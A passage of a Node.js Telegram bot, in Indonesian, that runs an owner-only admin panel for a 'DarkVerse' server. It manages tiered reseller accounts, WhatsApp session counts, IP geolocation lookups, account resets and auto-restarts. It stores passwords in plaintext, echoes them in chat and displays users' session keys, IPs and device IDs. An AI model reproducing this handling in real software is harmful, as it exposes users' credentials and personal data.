  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `telegram_id|username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !day) {
          return bot.sendMessage(id, "❌ Format salah. Gunakan `telegram_id|username|password|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
🆔 Telegram ID: ${telegramId}
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username_atau_telegram_id|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [identity, addDays] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        const user = findUserByIdentity(db, identity);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const result = extendUserExpiry(user, addDays);
        if (!result.ok) {
          return bot.sendMessage(id, result.message);
        }

        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${user.username} (${user.telegramId || '-'}) ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner && !isDeveloper) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan: `telegram_id|username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, role, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !role || !day) {
          return bot.sendMessage(id, "❌ Format salah. Gunakan `telegram_id|username|password|role|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
🆔 Telegram ID: ${telegramId}
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "zsnz");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder zsnz
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *zsnz* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'zsnz' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
    startUserSessions()
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);